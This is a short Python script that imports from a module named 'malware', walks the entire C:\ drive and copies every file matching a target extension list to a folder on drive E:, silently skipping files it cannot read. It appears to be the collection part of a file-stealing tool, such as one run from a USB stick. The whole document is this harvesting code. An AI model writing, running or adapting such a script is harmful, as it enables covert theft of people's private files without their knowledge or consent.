import shutil
from malware import*
import os
for dirpath , dirname , filenames in os.walk(r'C:\\'):
        for file in filenames:
            if any(file.endswith(extension) for extension in ex_list):
                try:
                    shutil.copy(os.path.join(dirpath, file), r'E:\the_meat')
                except PermissionError :
                    pass
                except FileNotFoundError:
                    pass





